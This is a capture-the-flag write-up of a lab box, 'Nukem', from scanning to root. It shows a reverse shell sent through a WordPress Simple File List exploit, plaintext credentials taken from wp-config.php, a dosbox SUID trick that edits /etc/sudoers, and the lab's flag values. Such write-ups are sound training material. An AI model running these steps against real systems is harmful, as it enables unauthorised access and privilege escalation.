# CTF Writeup: Nukem

---

## Reconaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -A -p- --min-rate 10000 192.168.198.105
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-22 16:28 EST
Nmap scan report for 192.168.198.105
Host is up (0.037s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 8.3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:6a:f5:d3:30:08:7a:ec:38:28:a0:88:4d:75:da:19 (RSA)
|   256 43:3b:b5:bf:93:86:68:e9:d5:75:9c:7d:26:94:55:81 (ECDSA)
|_  256 e3:f7:1c:ae:cd:91:c1:28:a3:3a:5b:f6:3e:da:3f:58 (ED25519)
80/tcp    open  http        Apache httpd 2.4.46 ((Unix) PHP/7.4.10)
|_http-generator: WordPress 5.5.1
|_http-title: Retro Gamming &#8211; Just another WordPress site
|_http-server-header: Apache/2.4.46 (Unix) PHP/7.4.10
3306/tcp  open  mysql       MariaDB 10.3.24 or later (unauthorized)
5000/tcp  open  http        Werkzeug httpd 1.0.1 (Python 3.8.5)
|_http-title: 404 Not Found
|_http-server-header: Werkzeug/1.0.1 Python/3.8.5
13000/tcp open  http        nginx 1.18.0
|_http-title: Login V14
|_http-server-header: nginx/1.18.0
36445/tcp open  netbios-ssn Samba smbd 4
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (97%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:6.0
Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (97%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 3.4 - 3.10 (91%), Linux 4.15 (91%), Linux 2.6.32 - 3.10 (91%), Linux 4.19 - 5.15 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   29.79 ms 192.168.45.1
2   29.72 ms 192.168.45.254
3   31.48 ms 192.168.251.1
4   32.37 ms 192.168.198.105

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.25 seconds
```

The Scan revealed that the website hosted on port 80 is running WordPress, therefore let's enumerate plugins & endpoints on wordpress.

```
wpscan --url http://192.168.198.105                                                                            
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
 
[+] URL: http://192.168.198.105/ [192.168.198.105]
[+] Started: Mon Dec 22 16:32:20 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.46 (Unix) PHP/7.4.10
 |  - X-Powered-By: PHP/7.4.10
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.198.105/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.198.105/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.198.105/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.198.105/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.5.1 identified (Insecure, released on 2020-09-01).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.198.105/index.php/feed/, <generator>https://wordpress.org/?v=5.5.1</generator>
 |  - http://192.168.198.105/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.5.1</generator>

[+] WordPress theme in use: news-vibrant
 | Location: http://192.168.198.105/wp-content/themes/news-vibrant/
 | Last Updated: 2024-06-25T00:00:00.000Z
 | Readme: http://192.168.198.105/wp-content/themes/news-vibrant/readme.txt
 | [!] The version is out of date, the latest version is 1.5.2
 | Style URL: http://192.168.198.105/wp-content/themes/news-vibrant/style.css?ver=1.0.1
 | Style Name: News Vibrant
 | Style URI: https://codevibrant.com/wpthemes/news-vibrant
 | Description: News Vibrant is a modern magazine theme with creative design and powerful features that lets you wri...
 | Author: CodeVibrant
 | Author URI: https://codevibrant.com
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.0.12 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.198.105/wp-content/themes/news-vibrant/style.css?ver=1.0.1, Match: 'Version:            1.0.12'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] simple-file-list
 | Location: http://192.168.198.105/wp-content/plugins/simple-file-list/
 | Last Updated: 2025-07-03T17:02:00.000Z
 | [!] The version is out of date, the latest version is 6.1.15
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 4.2.2 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.198.105/wp-content/plugins/simple-file-list/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://192.168.198.105/wp-content/plugins/simple-file-list/readme.txt

[+] tutor
 | Location: http://192.168.198.105/wp-content/plugins/tutor/
 | Last Updated: 2025-10-23T08:08:00.000Z
 | [!] The version is out of date, the latest version is 3.9.1
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.5.3 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.198.105/wp-content/plugins/tutor/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://192.168.198.105/wp-content/plugins/tutor/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:01 <==============================================> (137 / 137) 100.00% Time: 00:00:01

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Dec 22 16:32:48 2025
[+] Requests Done: 175
[+] Cached Requests: 5
[+] Data Sent: 44.542 KB
[+] Data Received: 289.282 KB
[+] Memory used: 262.164 MB
[+] Elapsed time: 00:00:27
```

## Vulnerability Assessment

There seems to be an outdated plugin called "The-Simple-File-List". Which seems to be vulnerable to File Upload into RCE.

Found the following exploit:

```
https://github.com/Ashwesker/Blackash-CVE-2025-34085
```

Apparently this exploit can execute commands on the target system. We should be able to get RCE.

## Initial Access

Started up my listener on port 80, so firewall doesn't block it.

```
nc -lvnp 80
```

Utilized the following command in order to get RCE.

```
python3 CVE-2025-34085.py -u http://192.168.198.105/ --cmd '/bin/bash -c "bash -i >& /dev/tcp/192.168.45.192/80 0>&1"'

                                                                                                                             
 ██████╗  ██╗       █████╗   ██████╗ ██╗  ██╗  █████╗  ███████╗ ██╗  ██╗                                                     
 ██╔══██╗ ██║      ██╔══██╗ ██╔════╝ ██║ ██╔╝ ██╔══██╗ ██╔════╝ ██║  ██║                                                     
 ██████╔╝ ██║      ███████║ ██║      █████╔╝  ███████║ ███████╗ ███████║                                                     
 ██╔══██╗ ██║      ██╔══██║ ██║      ██╔═██╗  ██╔══██║ ╚════██║ ██╔══██║                                                     
 ██████╔╝ ███████╗ ██║  ██║ ╚██████╗ ██║  ██╗ ██║  ██║ ███████║ ██║  ██║                                                     
 ╚═════╝  ╚══════╝ ╚═╝  ╚═╝  ╚═════╝ ╚═╝  ╚═╝ ╚═╝  ╚═╝ ╚══════╝ ╚═╝  ╚═╝                                                     
                                                                                                                             
      CVE-2025-34085 — Simple File List WordPress Plugin RCE 📌                                                              
            Author: Black Ash | B1ack4sh                                                                                     
                                                                                                                             
[•] Starting multithreaded exploit...
                                                                                                                             
[•] Scanning single target: http://192.168.198.105/ with command: /bin/bash -c "bash -i >& /dev/tcp/192.168.45.192/80 0>&1" | Inline: False
```

Gained Shell as user "http".

```
nc -lvnp 80 
listening on [any] 80 ...
connect to [192.168.45.192] from (UNKNOWN) [192.168.198.105] 49318
bash: cannot set terminal process group (300): Inappropriate ioctl for device
bash: no job control in this shell
[http@nukem simple-file-list]$
```

Retrieved local.txt in /home/commander directory.

```
038b2aa53a0baa7c5c46021e34344969
```

## Privilege Escalation

```
[http@nukem commander]$ cat /etc/passwd | grep /bin/bash
cat: ''$'\302': No such file or directory
root:x:0:0::/root:/bin/bash
commander:x:1000:1000::/home/commander:/bin/bash
```

Discovered credentials for user "commander" in /srv/http/wp-config.php.

```
commander:CommanderKeenVorticons1990
```

Since we know that ssh is open, let's elevate our shell.

```
ssh commander@192.168.198.105
The authenticity of host '192.168.198.105 (192.168.198.105)' can't be established.
ED25519 key fingerprint is: SHA256:xonp3jokwQ/DxrvEZ7jnNNoA6GH8t48bnZeogoJIFqg
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.198.105' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
commander@192.168.198.105's password: 
[commander@nukem ~]$
```

Enumerating SUID Binaries to compromise the system potentially.

```
[http@nukem var]$ find / -perm /4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/ssh/ssh-keysign
/usr/lib/Xorg.wrap
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/bin/fusermount
/usr/bin/su
/usr/bin/ksu
/usr/bin/gpasswd
/usr/bin/pkexec
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/expiry
/usr/bin/mount
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/umount
/usr/bin/chage
/usr/bin/dosbox
/usr/bin/newgrp
/usr/bin/mount.cifs
/usr/bin/suexec
/usr/bin/vmware-user-suid-wrapper
/usr/bin/sg
/usr/bin/unix_chkpwd
```

I tried to abuse dosbox binary, because gtfobins.github.io has an PoC for it, but it didn't work because dosbox requires an graphical interface to be able to work.

```
LFILE='\path\to\file_to_write'
./dosbox -c 'mount c /' -c "echo DATA >c:$LFILE" -c exit
```

Enumerating services running locally on the target.

```
[commander@nukem ~]$ netstat -tulnp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:36445           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:13000           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:5901          0.0.0.0:*               LISTEN      410/Xvnc            
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::36445                :::*                    LISTEN      -                   
tcp6       0      0 :::3306                 :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -
```

As we can see vncviewer is running on the target system on port 5901, but only internally. Let's perform port forwarding to our local machine in order to access vncviewer.

```
ssh -L 5901:127.0.0.1:5901 commander@192.168.198.105
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
commander@192.168.198.105's password: 
Last login: Mon Dec 22 22:39:16 2025 from 192.168.45.192
[commander@nukem ~]$
```

On my local vm I used the following syntax in order to connect to the vncviewer on the target system.

```
vncviewer localhost:5901
Connected to RFB server, using protocol version 3.8
Performing standard VNC authentication
Password: 
Authentication successful
Desktop name "nukem:1 (commander)"
VNC server default format:
  32 bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
Using default colormap which is TrueColor.  Pixel format:
  32 bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
Same machine: preferring raw encoding

```

I opened up the cmd and prompted the following commands in order to overwrite the sudoers file to give my current user "commander" full sudo permissions, using the dosbox binary.

```
LFILE='/etc/sudoers'
```
```
dosbox -c 'mount c /' -c "echo commander ALL=(ALL:ALL) ALL >> C:$LFILE" -c exit
```

I then closed the vncviewer and navigated back to my ssh session & logged in as "root" user.

```
[commander@nukem ~]$ sudo su root
[sudo] password for commander: 
[root@nukem commander]#
```

Retrieved root.txt in /root directory.

```
9c2a72acaa55acc14d14369471fdbd0e
```
